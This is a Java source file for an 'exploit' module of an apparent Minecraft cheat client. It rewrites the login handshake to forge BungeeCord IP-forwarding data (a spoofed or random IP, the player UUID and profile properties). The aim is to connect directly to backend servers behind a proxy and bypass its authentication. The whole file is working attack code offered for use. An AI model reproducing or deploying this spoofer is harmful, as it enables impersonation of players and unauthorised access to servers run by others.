package de.vandalismdevelopment.vandalism.feature.module.impl.exploit;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.PropertyMap;
import de.florianmichael.dietrichevents2.DietrichEvents2;
import de.vandalismdevelopment.vandalism.base.event.PacketListener;
import de.vandalismdevelopment.vandalism.feature.module.AbstractModule;
import de.vandalismdevelopment.vandalism.base.value.Value;
import de.vandalismdevelopment.vandalism.base.value.impl.primitive.BooleanValue;
import de.vandalismdevelopment.vandalism.base.value.impl.primitive.StringValue;
import net.minecraft.network.NetworkState;
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;

import java.util.concurrent.ThreadLocalRandom;

public class BungeeCordSpooferModule extends AbstractModule implements PacketListener {

    private final Value<Boolean> customizeIP = new BooleanValue(this, "Customize IP", "Allows you to define the ip by your-self.", false);
    private final Value<String> ip = new StringValue(this, "IP", "The IP that will be used.", "127.0.0.1").visibleCondition(this.customizeIP::getValue);
    private final Value<Boolean> sendMoreData = new BooleanValue(this, "Send More Data", "Sends everything BungeeCord would send.", false);

    private static final Gson GSON = new GsonBuilder().registerTypeAdapter(PropertyMap.class, new PropertyMap.Serializer()).create();

    public BungeeCordSpooferModule() {
        super("Bungee Cord Spoof", "Allows you to connect to a bungee cord sub server.", Category.EXPLOIT);
    }

    @Override
    public void onEnable() {
        DietrichEvents2.global().subscribe(PacketEvent.ID, this);
    }

    @Override
    public void onDisable() {
        DietrichEvents2.global().unsubscribe(PacketEvent.ID, this);
    }

    private String getRandomIpPart() {
        return String.valueOf(ThreadLocalRandom.current().nextInt(256));
    }

    @Override
    public void onPacket(final PacketEvent event) {
        if (event.packet instanceof final HandshakeC2SPacket handshakeC2SPacket) {
            if (handshakeC2SPacket.getNewNetworkState() == NetworkState.LOGIN) {
                if (this.sendMoreData.getValue()) {
                    final String address;
                    if (this.customizeIP.getValue()) address = this.ip.getValue();
                    else address = this.getRandomIpPart() + "." + this.getRandomIpPart() + "." + this.getRandomIpPart() + "." + this.getRandomIpPart();

                    final GameProfile profile = this.mc.getGameProfile();
                    String newAddress = address + "\00" + address + "\00" + profile.getId().toString();
                    if (profile.getProperties() != null && !profile.getProperties().isEmpty())
                        newAddress += "\00" + GSON.toJson(profile.getProperties());

                    handshakeC2SPacket.address = newAddress;
                } else {
                    handshakeC2SPacket.address += "\u0000";
                    if (this.customizeIP.getValue())
                        handshakeC2SPacket.address = this.ip.getValue();
                     else
                        handshakeC2SPacket.address += this.getRandomIpPart() + "." + this.getRandomIpPart() + "." + this.getRandomIpPart() + "." + this.getRandomIpPart();

                    handshakeC2SPacket.address += "\u0000" + this.mc.session.getUuidOrNull().toString().replace("-", "");
                }
            }
        }
    }

}